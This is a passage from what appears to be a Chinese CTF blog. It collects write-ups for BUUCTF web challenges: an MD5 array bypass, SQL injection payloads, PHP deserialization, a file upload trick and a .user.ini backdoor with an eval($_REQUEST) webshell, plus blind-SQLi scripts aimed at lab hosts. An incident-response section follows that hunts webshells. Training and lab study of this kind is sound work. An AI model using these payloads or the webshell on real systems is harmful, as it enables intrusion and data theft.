class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>第一个条件直接数组绕过。</p><p>第二个条件在数字后面加上字母进行弱比较绕过</p><p>payload：</p><p>get：?id[]&#x3D;1&amp;gg[]&#x3D;2</p><p>post：passwd&#x3D;1234567a</p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>fuzz跑一下</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733320335167-92e223af-bf64-4645-bfde-171f8c6b251b.png" alt="img"></p><p>union被过滤了还有等号，那么联合注入和bool注入就用不了。</p><p>但是报错注入的关键字没有被过滤。空格被过滤了还可以用括号进行绕过</p><p>?username&#x3D;1&amp;password&#x3D;1’or(updatexml(1,(concat(0x7e,database())),3))%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733320838696-be5b5597-77f6-41e5-8c89-64bac2454dfa.png" alt="img"></p><p>爆表名，payload：</p><p>1&amp;password&#x3D;1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’)),0x7e),1))%23</p><p>或者concat也可以使用两个参数;</p><p>1’or(updatexml(0,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))),0))%23</p><p>但是这题#好像不能使用，需要用%23，这里的括号绕过空格语法是：去掉空格然后加上左括号，最后在from，where，like，or等这些连接词前加上右括号。</p><p>爆列名：</p><p>?username&#x3D;1&amp;password&#x3D;1’or(updatexml(0,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))),0))%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733323370405-b2a3586a-2a2d-4f1f-91eb-b01d46d2cd29.png" alt="img"></p><p>最后拿flag：</p><p>?username&#x3D;1&amp;password&#x3D;1’or(updatexml(0,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),0))%23</p><p>因为substr和mid被禁了，所以用right（left也行）</p><p>payload：</p><p>?username&#x3D;1&amp;password&#x3D;1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733323824220-9bcdc991-66ad-4858-93e3-0696ac851af8.png" alt="img"></p><p>最后将flag拼上</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>这题是一道反序列化题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">//进行赋值，然后调用process()函数</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//如果op=1，调用write函数。等于2调用output函数</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//content长度不能大于100，将content内容写入进filename并赋值为res。</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line">//如果filename设置，返回filename的文件内容</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line">//输出变量内容</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//如果op=2，强制将op设置为1，然后将content赋值为空。最后调用process()函数</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">//要求字符为可见字符</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路就是用比较绕过destruct魔术方法，然后进行文件读取。</p><p>反序列化触发</p><p>​    function __destruct() {</p><p>​        if($this-&gt;op &#x3D;&#x3D;&#x3D; “2”)</p><p>​            $this-&gt;op &#x3D; “1”;</p><p>​        $this-&gt;content &#x3D; “”;</p><p>​        $this-&gt;process();</p><p>​    }</p><p>最后调用</p><p>​    public function process() {</p><p>​        if($this-&gt;op &#x3D;&#x3D; “1”) {</p><p>​            $this-&gt;write();</p><p>​        } else if($this-&gt;op &#x3D;&#x3D; “2”) {</p><p>​            $res &#x3D; $this-&gt;read();</p><p>​            $this-&gt;output($res);</p><p>​        } else {</p><p>​            $this-&gt;output(“Bad Hacker!”);</p><p>​        }</p><p>​    }</p><p>这里能够读取文件的就是：</p><p>​            $res &#x3D; $this-&gt;read();</p><p>​            $this-&gt;output($res);</p><p>所以要让op的值为2，但是__destruct有个判断（是一个强比较与字符串2进行判断，这里可以用数字2绕过）</p><h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>php脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op=2;</span><br><span class="line">    protected $filename=&#x27;flag.php&#x27;;</span><br><span class="line">    protected $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=serialize(new FileHandler());</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$a=str_replace(&quot;s&quot;,&quot;S&quot;,$a);//利用大写S采用的十六进制，来绕过is_valid中对空字节的检查</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure><p>最后将%00换成\00</p><p>payload:</p><p>O:11:”FileHandler”:3:{S:5:”\00*\00op”;i:2;S:11:”\00*\00filename”;S:8:”flag.php”;S:10:”\00*\00content”;N;}<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733405163823-cbcdc163-65d7-4347-8927-e312baf2fd5b.png" alt="img"></p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>php7.1+的版本对属性类型不敏感，本地序列化的时候将protected属性改为public进行绕过。</p><p>对于php版本可以在响应头中看到：</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733405556651-f3f966e7-2920-491b-be4e-74467bb8ad96.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">    public $op=2;</span><br><span class="line">    public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">    public $content=2;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>payload：</p><p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;s:7:”content”;i:2;}</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>最后发现image&#x2F;jpeg是能够上传的</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733405774988-18c39a0a-5d93-4171-970e-fd9595533d94.png" alt="img"></p><p>然后发现服务器是openresty，它是基于nigix，而nigix也是可以支持.htaccess文件的（通常支持.htaccess的是apache）</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733406200700-7ada14ce-b1ee-460b-aae4-6f80ae085b8c.png" alt="img"></p><p>然后上传一个.htaccess文件。改content-type:image&#x2F;jpeg</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733406116287-3f9169c9-fecc-4cc8-903b-449f66b2cfe9.png" alt="img"></p><p>成功执行命令。</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733406064956-401a03df-e676-4c60-b383-5f56b2052d73.png" alt="img"></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>这题可以用usr.ini配置文件来构造一个后门。首先来认识两个配置项：</p><p>auto_preappend_file：指定一个文件，自动包含在要执行的文件前。类似于require()函数。</p><p>auto_append_file：指定一个文件，在文件后包含。</p><p>这题先上传一个.usr.ini文件，内容为：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544545603-da99bc5e-1d01-417d-a72f-7392d03d6dc3.png" alt="img"></p><p>然后再上传一个a.jpg</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_REQUEST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544724822-45c8d4fb-b447-48d5-ac03-38e3788a812c.png" alt="img"></p><p>最后访问路径+index.php，执行命令成功执行。</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733544621014-c7db06fd-8082-4a85-9e75-a271d2ed87f3.png" alt="img"></p><h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>查看源码发现一段base32源码:</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733549472085-ae5bf173-ed09-4aec-9353-585303f7ea70.png" alt="img"></p><p>经过base32解码，base64解码，最后得到一条sql语句：</p><p>select * from user where username &#x3D; ‘$name’</p><p>然后判断列数为3列。</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733549910201-3400eea6-701f-4e8a-9a08-b12481ae83e7.png" alt="img"></p><p>这三列通常是id，username，passwd。</p><p>这里也可以进行验证：</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733549955104-bbb30b59-0114-4e58-8077-6db4554af8db.png" alt="img"></p><p>报错没有这个user。</p><p>当换成admin的时候：报错密码错误。由此猜测第二列为username</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733550004184-a185f560-99a2-4bd7-877b-2a28fb5b7838.png" alt="img"></p><p>这道题用到的知识点就是，使用union联合查询的时候，会在表里新增联合查询的内容</p><p>如下：</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733550135519-3cfcf296-a3dd-4d73-b3b5-3e994b3f3ca6.png" alt="img"></p><p>利用这点，我们可以新增一个admin，然后将密码覆盖为123</p><p>但是打渗透的话就会知道，密码数据库里面的密码通常是经过加密的，最后密码试了以下md5加密，就出来了</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733550429201-c75b9671-d092-4daf-887e-ef24904632b8.png" alt="img"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>查询数据库：</p><p>show databases;</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733546629736-ed7cb966-e627-4b60-9e2b-42e381f8b5e6.png" alt="img"></p><p>查询表：</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733546667657-ef0c08e3-fbe4-43b0-8deb-3c02245ac8bd.png" alt="img"></p><p>用handler查询flag：</p><p>payload:</p><p>?inject&#x3D;1’;handler FlagHere open;handler FlagHere read first;</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733546593269-028e75cb-4395-44b3-88a7-83dc19133d21.png" alt="img"></p><p>因为这题禁用了prepare，不然可以用预编译：</p><p>1’;prepare a from concat(‘s’,’elect * from FlagHere’);excute a;#</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>经过测试当结果为1的时候</p><p>输出： Hello, glzjin wants a girlfriend.  </p><p>当结果为2的时候</p><p>输出： Do you want to be my girlfriend?  </p><p>当结果为其他的时候</p><p>输出：  Error Occured When Fetch Result.  </p><p>当用联合查询的时候，出现了waf，于是就用fuzz跑一下</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733550848752-b9fb5c93-5355-4811-b681-51d0a1ab4dfc.png" alt="img"></p><p>这些都过滤了：</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733905198815-88dbee96-527d-4434-93e7-c81e858cc81e.png" alt="img"></p><p>直接上脚本。</p><p>·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 二分法</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://75073420-9c74-41e5-b9fb-6bfe86d0efc8.node5.buuoj.cn:81/index.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    letf = 32</span><br><span class="line">    right = 127</span><br><span class="line">    while letf &lt; right:</span><br><span class="line">        mid = (letf+right) // 2</span><br><span class="line">        payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;</span><br><span class="line">        data = &#123;&quot;id&quot;:payload&#125; </span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        if &quot;Hello&quot; in res:</span><br><span class="line">            letf = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            right = mid</span><br><span class="line">    if letf != 32:</span><br><span class="line">        flag += chr(letf)</span><br><span class="line">        print(flag)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://0f594c63-4512-421d-94e3-5f261e2e70fa.node5.buuoj.cn:81/&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for x in range(1, 50):</span><br><span class="line">    high = 137</span><br><span class="line">    low = 32</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        payload = &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot; % (x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Hello&#x27; in response.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (high + low) // 2</span><br><span class="line">    flag += chr(int(mid))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应-webshell查杀</title>
      <link href="/2025/04/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/"/>
      <url>/2025/04/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<p>应急响应章节</p><span id="more"></span><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>前置知识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">netstat</span><br><span class="line"></span><br><span class="line">全称 Network Statistics（网络统计），用于显示网络连接、路由表、接口统计等信息。</span><br><span class="line"></span><br><span class="line">-a</span><br><span class="line"></span><br><span class="line">显示 所有活动连接 和 监听的端口（包括 TCP 和 UDP 协议）。</span><br><span class="line"></span><br><span class="line">-n</span><br><span class="line"></span><br><span class="line">以 数字形式 显示地址和端口号（不解析为主机名或服务名称，加快显示速度）。</span><br><span class="line"></span><br><span class="line">-o</span><br><span class="line"></span><br><span class="line">显示每个连接关联的 进程 ID（PID），方便定位是哪个程序占用了端口。</span><br></pre></td></tr></table></figure><p>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p><p>首先定位web服务器，查看网络发现开放了80端口， 显示所有的网络连接及其关联的进程 ID（PID）  </p><p>netstat -ano</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743752725630-a8bbd770-0a6d-4666-8643-288c0eb972ef.png" alt="img"></p><p>netstat -anp | grep 80查找当前系统上所有涉及端口80的网络连接</p><p>查看端口对应应用知道了使用的是 web服务器 apache</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743752807159-a87d3e24-3d85-49ba-ba3b-261a234a858d.png" alt="img"></p><p>进入根目录，发现一个shell.php，代码中没有特别的内容。</p><p>然后使用find命令进行查找：看是否包含了恶意函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -name &quot;.php&quot; | xargs grep &quot;eval(&quot;</span><br><span class="line"></span><br><span class="line">find ./ -type f -name &quot;.php&quot; | xargs grep &quot;assert(&quot;</span><br></pre></td></tr></table></figure><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743754297474-1b6d1300-0b51-41cd-81f9-34ae47238020.png" alt="img"></p><p>发现了三个文件，一个一个的看。最后在include&#x2F;gz.php中发现了flag</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743754355190-00c810f6-f0e9-4d7c-9cf6-32a95138af91.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>黑客使用的什么工具的shell github地址的md5 flag{md5}</p><p>常用的webshell连接工具主要有以下几款：</p><p>caidao，Antsword，Behinder，Godzila  可以通过下面这个文章查看他们的shell特点。对比以下发现16位key。像是Behinder，但是名字是：gz.php，所以就直接指向了Godzila</p><p><a href="https://www.freebuf.com/articles/web/324622.html">https://www.freebuf.com/articles/web/324622.html</a></p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743754745713-2b444a44-eb26-4be1-9b2c-5033acdbcf84.png" alt="img"><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743754757365-396eff9d-9f63-49c7-ae53-7dc5af38844a.png" alt="img"></p><p>得到flag：flag{39392de3218c333f794befef07ac9257}</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</p><p>在linux中，文件如果以  .  开头通过ls就不会显示，需要 ls -a 才会显示。之前使用find .&#x2F; -type f -name “*.php”|xargs grep “eval(“</p><p>发现了一个   .Mysqli.php，这个是以 . 开头的，所以断定就是hacker隐藏的shell</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743755525562-83f80198-4272-4684-b20f-abd1fb12ecff.png" alt="img"></p><p>所以路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php</p><p>然后进行md5加密：echo -n “&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php”|md5sum</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/1743755860815-1f17d527-bc1f-4b0e-b472-918b08262569.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>黑客免杀马完整路径 md5 